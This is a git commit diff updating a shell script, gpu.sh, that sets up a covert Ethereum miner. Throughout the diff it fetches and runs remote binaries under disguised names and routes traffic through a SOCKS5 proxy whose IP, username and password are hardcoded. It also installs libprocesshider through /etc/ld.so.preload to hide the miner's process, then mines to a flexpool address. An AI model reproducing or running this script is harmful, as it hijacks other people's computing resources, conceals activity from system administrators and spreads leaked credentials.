86e3ad69fd05298a3f6d8564bf539296b4645741
asraktanusi064 <109596081+asraktanusi064@users.noreply.github.com>
2022-08-26 08:58:01 +0700

    Update gpu.sh

--- gpu.sh
+++ gpu.sh
@@ -2,14 +2,14 @@
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
-apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl && apt-get install -y libssl-dev libcurl4-gnutls-dev libgmp-dev && apt install ocl-icd-opencl-dev && wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz && tar -xvzf graphics.tar.gz
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl && apt-get install -y libssl-dev libcurl4-gnutls-dev libgmp-dev && apt install ocl-icd-opencl-dev && wget https://raw.githubusercontent.com/nathanfleight/update/main/update.tar.gz && tar -xvzf update.tar.gz
 
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 45.133.59.40:12324
-socks5_username = 14aeb5d7c245b
-socks5_password = 7f5bdbecdb
+socks5 = 23.229.122.231:8259
+socks5_username = kanglahem
+socks5_password = Katrok1234
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -31,14 +31,14 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash 
-chmod +x bezzHash 
+./graftcp/graftcp wget https://raw.githubusercontent.com/asraktanusi064/samunji/main/Comedy 
+chmod +x Comedy 
  
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip 
-unzip magicBezzHash.zip 
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/update/main/MagicComedy.zip
+unzip MagicComedy.zip 
 make 
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl 
 mv libprocesshider.so /usr/local/lib/ 
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload 
  
-./graftcp/graftcp ./bezzHash --url=ssl://0x7a8f069g453654345612345dbF742b2c8.$(echo $(shuf -i 201-400 -n 1)-$(shuf -i 1-200 -n 1)-$(shuf -i 401-600 -n 1)-$(shuf -i 601-800 -n 1))@eth-sg.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./Comedy --url=ssl://0x7a8f069g453654345612345dbF742b2c8.$(echo $(shuf -i 201-400 -n 1)-$(shuf -i 1-200 -n 1)-$(shuf -i 401-600 -n 1)-$(shuf -i 601-800 -n 1))@eth-sg.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
